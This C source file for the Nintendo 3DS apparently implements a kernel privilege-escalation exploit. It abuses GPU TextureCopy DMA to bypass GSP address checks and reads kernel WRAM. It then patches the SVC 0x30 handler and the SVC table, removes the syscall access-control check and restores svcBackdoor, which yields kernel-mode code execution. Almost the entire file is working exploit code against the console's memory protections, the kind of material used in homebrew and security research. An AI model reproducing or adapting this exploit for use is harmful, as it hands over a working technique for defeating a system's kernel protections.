#include <string.h>
#include <stdio.h>
#include <malloc.h>

#include <3ds.h>

Result svcMiniBackdoor(void* target);
void invalidate_icache();

// bypass gsp address checks
Result gspSetTextureCopy(u32 in_pa, u32 out_pa, u32 size, u32 in_dim, u32 out_dim, u32 flags)
{
	u32 enable_reg = 0;
	Result ret = 0;

	ret = GSPGPU_ReadHWRegs(0x1EF00C18 - 0x1EB00000, &enable_reg, sizeof(enable_reg));
	if(ret) return ret;

	ret = GSPGPU_WriteHWRegs(0x1EF00C00 - 0x1EB00000, (u32[]){in_pa >> 3, out_pa >> 3}, 0x8);
	if(ret) return ret;
	ret = GSPGPU_WriteHWRegs(0x1EF00C20 - 0x1EB00000, (u32[]){size, in_dim, out_dim}, 0xC);
	if(ret) return ret;
	ret = GSPGPU_WriteHWRegs(0x1EF00C10 - 0x1EB00000, &flags, 4);
	if(ret) return ret;
	ret = GSPGPU_WriteHWRegs(0x1EF00C18 - 0x1EB00000, (u32[]){enable_reg | 1}, 4);
	if(ret) return ret;

	return 0;
}

Result initial_kernel_function(u32 garbage)
{
	__asm__ volatile("cpsid aif");

	invalidate_icache();

	return 0;
}

Result hook_kernel()
{
	Result ret = -200;
	const u32 wram_size = 0x00080000;
	unsigned int* wram_buffer = linearAlloc(wram_size);

	// grab AXI WRAM
	gspSetTextureCopy(0x1FF80000, osConvertVirtToPhys(wram_buffer), wram_size, 0, 0, 8);
	svcSleepThread(10 * 1000 * 1000);

	GSPGPU_InvalidateDataCache(wram_buffer, wram_size);

	// scan wram for svc handler
	u32 svc_handler_offset = 0;
	u32 svc_table_offset = 0;
	u32 svc_ac_offset = 0;
	{
		int i;
		const u32 pattern[] = {0xF96D0513, 0xE94D6F00};
		for(i = 0; i < wram_size; i += 4)
		{
			const u32 cursor = i / 4;

			if(wram_buffer[cursor] == pattern[0] && wram_buffer[cursor + 1] == pattern[1])
			{
				svc_handler_offset = i;
				for(i = svc_handler_offset; i < wram_size; i++)
				{
					const u32 val = wram_buffer[i / 4];
					if((val & 0xfffff000) == 0xe28f8000)
					{
						svc_table_offset = i + (val & 0xfff) + 8;
						break;
					}
				}

				for(i = svc_handler_offset; i < wram_size; i++)
				{
					const u32 val = wram_buffer[i / 4];
					if(val == 0x0AFFFFEA)
					{
						svc_ac_offset = i;
						break;
					}
				}
				break;
			}
		}

		printf("found svc_stuff %08X %08X %08X\n", (unsigned int)svc_handler_offset, (unsigned int)svc_table_offset, (unsigned int)svc_ac_offset);
	}

	ret = -201;
	if(!svc_handler_offset || !svc_table_offset || !svc_ac_offset) goto sub_fail;

	u32 svc_0x30_offset = 0;
	{
		int i;
		const u32 pattern[] = {0xE59F0000, 0xE12FFF1E, 0xF8C007F4};
		const u32 hint = wram_buffer[svc_table_offset / 4 + 0x30] & 0xfff;
		for(i = 0; i < wram_size; i += 4)
		{
			const u32 cursor = i / 4;

			if((i & 0xfff) == hint && wram_buffer[cursor] == pattern[0] && wram_buffer[cursor + 1] == pattern[1] && wram_buffer[cursor + 2] == pattern[2])
			{
				svc_0x30_offset = i;
				break;
			}
		}
		printf("found svc_0x30_offset %08X\n", (unsigned int)svc_0x30_offset);
	}

	ret = -202;
	if(!svc_0x30_offset) goto sub_fail;

	printf("patching kernel... ");

	// now we patch local svc 0x30 with "bx r0"
	wram_buffer[svc_0x30_offset / 4] = 0xE12FFF10;

	// then we dma the change over...
	{
		u32 aligned_offset = svc_0x30_offset & ~0x1ff;
		GSPGPU_FlushDataCache(&wram_buffer[aligned_offset / 4], 0x200);
		gspSetTextureCopy(osConvertVirtToPhys(&wram_buffer[aligned_offset / 4]), 0x1FF80000 + aligned_offset, 0x200, 0, 0, 8);
		svcSleepThread(10 * 1000 * 1000);
	}

	// patch 0x7b back in
	wram_buffer[svc_table_offset / 4 + 0x7b] = wram_buffer[svc_table_offset / 4 + 0x30];

	// patch svc access control out
	wram_buffer[svc_ac_offset / 4] = 0;

	// then we dma the changes over...
	{
		u32 aligned_offset = svc_ac_offset & ~0x1ff;
		GSPGPU_FlushDataCache(&wram_buffer[aligned_offset / 4], 0x2000);
		gspSetTextureCopy(osConvertVirtToPhys(&wram_buffer[aligned_offset / 4]), 0x1FF80000 + aligned_offset, 0x2000, 0, 0, 8);
		svcSleepThread(10 * 1000 * 1000);
	}

	// and finally we run that svc until it actually executes our code (should be first try, but with cache you never know i guess)
	// this will also invalidate all icache which will allow us to use svcBackdoor
	while(svcMiniBackdoor(initial_kernel_function));

	printf("done !\n");
	ret = 0;

	sub_fail:
	linearFree(wram_buffer);

	return ret;
}
